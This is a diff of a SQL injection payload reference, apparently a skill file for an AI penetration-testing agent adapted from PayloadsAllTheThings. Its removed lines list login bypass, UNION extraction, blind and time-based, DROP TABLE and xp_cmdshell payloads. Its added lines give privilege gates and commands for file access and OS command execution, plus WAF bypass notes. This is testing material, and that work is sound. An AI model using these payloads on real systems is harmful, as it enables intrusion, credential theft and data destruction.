@@ -1,5 +1,5 @@
 ---
-description: UNION, blind, error-based, time-based, WAF bypass, auth bypass per DB type
+description: Per-DBMS privilege gates for file and OS steps, DBMS fingerprinting, OOB extraction, SQLite time oracle, LDAP and XPath probes
 skill: sqli-testing
 source: PayloadsAllTheThings — SQL Injection
 source_revision: 3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a
@@ -10,206 +10,32 @@ source_license: MIT; see THIRD_PARTY_NOTICES.md
 
 > Source: PayloadsAllTheThings — SQL Injection
 
-## Authentication Bypass (Top 20)
+## File and OS Access — Privilege Gates
 
-```sql
-' OR '1'='1'--
-' or 1=1 limit 1 --
-admin' OR '1'='1'--
-' OR '1'='1
-' or '1'='1' /*
-' or 1=1 #
-' or 1=1 /*
-') or ('1'='1
-') or ('1'='1'--
-admin'--
-admin' #
-admin'/*
-' or 'a'='a
-" or "a"="a
-' or 1=1 --
-1 or 1=1
-1' or '1'='1
-') OR 1=1--
-' OR '1'='1'/*
-admin' AND 1=0 UNION ALL SELECT 'admin','81dc9bdb52d04dc20036dbd8313ed055'--
-```
+Check the privilege before spending requests on a file or OS step; most fail on the grant, not the
+payload. File writes and OS commands change target state and need operator approval.
 
-## UNION-Based Injection
+| DBMS | Step | Gate |
+|------|------|------|
+| MySQL | `LOAD_FILE()` read, `INTO OUTFILE` write | FILE privilege. `SELECT @@secure_file_priv`: `NULL` = file I/O disabled; a path (`/var/lib/mysql-files/`) = confined to that directory; empty = unrestricted. `INTO OUTFILE` is double-gated: FILE plus a writable web-served directory. |
+| MySQL | OS command via UDF | Write a `.so`/`.dll` into `plugin_dir` plus `CREATE FUNCTION` (INSERT on `mysql.func`). Rarely possible; never on managed MySQL. |
+| PostgreSQL | `pg_read_file()`, `COPY … FROM '<file>'` | Superuser or `pg_read_server_files`. |
+| PostgreSQL | `COPY … TO '<file>'` | Superuser or `pg_write_server_files`. |
+| PostgreSQL | `COPY … TO PROGRAM '<cmd>'` | Superuser or `pg_execute_server_program`; disabled on RDS and Cloud SQL. |
+| MSSQL | `OPENROWSET(BULK '<file>', SINGLE_CLOB)` | ADMINISTER BULK OPERATIONS; rare on modern installs. |
+| MSSQL | `xp_cmdshell` | Off by default; re-enabling needs sysadmin: `EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;`. Absent on Azure SQL Database. |
+| Managed (RDS, Aurora, Cloud SQL, Azure SQL) | any file/OS step | FILE is never granted and OS access is blocked: go for data extraction → credentials in application tables instead. |
 
-### Column Enumeration
-
-```sql
-' UNION SELECT NULL--
-' UNION SELECT NULL,NULL--
-' UNION SELECT NULL,NULL,NULL--
-' UNION SELECT NULL,NULL,NULL,NULL--
-' UNION SELECT NULL,NULL,NULL,NULL,NULL--
-' ORDER BY 1--
-' ORDER BY 2--
-' ORDER BY 10--
-```
-
-### MySQL Data Extraction
-
-```sql
-' UNION SELECT version(),database()--
-' UNION SELECT table_name,column_name FROM information_schema.columns--
-' UNION SELECT username,password FROM users--
-' UNION SELECT CONCAT(user,':',password),3 FROM mysql.user--
-' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()--
-```
-
-### PostgreSQL Data Extraction
-
-```sql
-' UNION SELECT current_user,current_database()--
-' UNION SELECT version(),inet_client_addr()--
-' UNION SELECT table_name,column_name FROM information_schema.columns--
-' UNION SELECT usename,usesuper FROM pg_user--
-```
-
-### MSSQL Data Extraction
-
-```sql
-' UNION SELECT @@version,@@servername--
-' UNION SELECT name,xtype FROM sysobjects--
-' UNION SELECT table_name,column_name FROM information_schema.columns--
-```
-
-### Oracle Data Extraction
-
-```sql
-' UNION SELECT banner,NULL FROM v$version--
-' UNION SELECT username,account_status FROM dba_users--
-' UNION SELECT table_name,column_name FROM user_tab_columns--
-```
-
-### SQLite Data Extraction
-
-```sql
-' UNION SELECT name,sql FROM sqlite_master WHERE type='table'--
-' UNION SELECT tbl_name,sql FROM sqlite_master--
-```
-
-## Error-Based Injection
-
-### MySQL
-
-```sql
-' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--
-' AND updatexml(1,concat(0x7e,(SELECT user())),1)--
-' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)y)--
-```
-
-### PostgreSQL
-
-```sql
-' AND CAST((SELECT version()) as numeric)--
-' AND 1=CAST((SELECT version()) as int)--
-```
-
-### MSSQL
-
-```sql
-' AND CONVERT(int,(SELECT @@version))--
-' AND 1=CAST((SELECT @@servername) as int)--
-```
-
-### Oracle
-
-```sql
-' AND CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version))--
-' AND EXTRACTVALUE(1,CONCAT('~',(SELECT banner FROM v$version)))--
-```
-
-## Blind Injection — Boolean-Based
-
-```sql
--- MySQL
-1 AND 1=1 --          -- true condition
-1 AND 1=2 --          -- false condition
-1 AND LENGTH(database())=5 --
-1 AND SUBSTRING(database(),1,1)='a' --
-1 AND ASCII(SUBSTRING(database(),1,1))>100 --
-
--- PostgreSQL
-1 AND LENGTH(current_user)=10 --
-1 AND SUBSTRING(current_user,1,1)='p' --
-```
-
-## Blind Injection — Time-Based
-
-```sql
--- MySQL
-' AND SLEEP(5)--
-' AND IF(1=1,SLEEP(5),0)--
-' AND IF(ASCII(SUBSTRING(user(),1,1))>100,SLEEP(5),0)--
-' AND IF(SUBSTRING(VERSION(),1,1)='5',BENCHMARK(1000000,MD5(1)),0)--
-
--- PostgreSQL
-' AND CASE WHEN 1=1 THEN pg_sleep(5) ELSE pg_sleep(0) END--
-' AND CASE WHEN ASCII(SUBSTRING(current_user,1,1))>100 THEN pg_sleep(5) ELSE pg_sleep(0) END--
-
--- MSSQL
-' WAITFOR DELAY '00:00:05'--
-'; IF 1=1 WAITFOR DELAY '00:00:05'--
-
--- SQLite (no native sleep — use heavy computation or boolean)
-' AND CASE WHEN 1=1 THEN randomblob(500000000) ELSE 0 END--
-```
-
-## Stacked Queries
-
-```sql
-'; DROP TABLE users--
-'; EXEC xp_cmdshell('whoami')--
-'; UPDATE users SET admin=1--
-'; INSERT INTO admin VALUES('hacker','password')--
-'; SELECT * INTO OUTFILE '/tmp/output.txt' FROM users--
-```
+Cross-database reach is the usual Critical path: `information_schema.schemata` (MySQL) or
+`master..sysdatabases` (MSSQL) lists co-hosted databases, and a shared multi-tenant database means
+one injection reaches every tenant.
 
 ## WAF Bypass Techniques
 
-### Whitespace Alternatives (URL-Encoded)
-
-```
-%09  (tab)
-%0A  (line feed)
-%0B  (vertical tab)
-%0C  (form feed)
-%0D  (carriage return)
-%A0  (non-breaking space)
-```
-
-### Case Alternation
-
-```sql
-uNiOn SeLeCt
-UnIoN/**/aLl/**/SeLeCt
-```
-
-### Operator Substitution
-
-```sql
-AND  ->  &&
-OR   ->  ||
-=    ->  LIKE / REGEXP / BETWEEN
->    ->  NOT BETWEEN 0 AND X
-WHERE -> HAVING
-```
-
-### Parenthesis Grouping
-
-```sql
-(1)and(1)=(1)--
-(1)or(1)=(1)--
-```
-
 ### Comment-Splitting (legacy — rarely effective against modern WAFs)
 
-`agent/skills/sqli-testing/SKILL.md` "WAF Bypass Reality" — every default ruleset on
-Cloudflare/AWS WAF/Akamai signature-matches this split now; do not spend engagement
+Every default ruleset on Cloudflare/AWS WAF/Akamai signature-matches this split (the shapes that
+still pass are in `agent/references/web/waf-bypass-and-safe-testing.md` §E); do not spend engagement
 time on it as a bypass. Kept here as raw syntax that is still useful against an
 unpatched target or a request path with no WAF in front of it:
 
@@ -240,9 +66,16 @@ sqlite_version()=sqlite_version()
 ROWNUM=ROWNUM
 ```
 
+## Blind Injection — Time-Based
+
+```sql
+-- SQLite (no native sleep — use heavy computation or boolean)
+' AND CASE WHEN 1=1 THEN randomblob(500000000) ELSE 0 END--
+```
+
 ## NoSQL Injection
 
-See `nosql-injection-payloads.md` for full MongoDB operator injection, blind extraction, `$where` injection, WAF bypass, and automation scripts.
+See `nosql-injection-payloads.md` for MongoDB operator injection, blind extraction, `$where` injection and WAF bypass.
 
 ## Out-of-Band (OOB) Extraction
 
